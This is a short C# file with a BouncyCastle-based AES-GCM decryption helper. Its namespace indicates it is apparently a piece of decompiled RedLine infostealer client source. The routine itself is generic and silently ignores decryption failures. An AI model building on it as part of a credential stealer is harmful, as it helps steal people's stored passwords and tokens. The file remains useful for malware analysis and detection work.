using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Text;

namespace RedLine.Client.Logic.Crypto
{
  public static class AesGcm256
  {
    public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
    {
      string str = string.Empty;
      try
      {
        GcmBlockCipher gcmBlockCipher = new GcmBlockCipher((IBlockCipher) new AesFastEngine());
        gcmBlockCipher.Init(false, (ICipherParameters) new AeadParameters(new KeyParameter(key), 128, iv, (byte[]) null));
        byte[] numArray = new byte[gcmBlockCipher.GetOutputSize(encryptedBytes.Length)];
        int outOff = gcmBlockCipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, numArray, 0);
        gcmBlockCipher.DoFinal(numArray, outOff);
        str = Encoding.UTF8.GetString(numArray).TrimEnd("\r\n\0".ToCharArray());
      }
      catch
      {
      }
      return str;
    }
  }
}
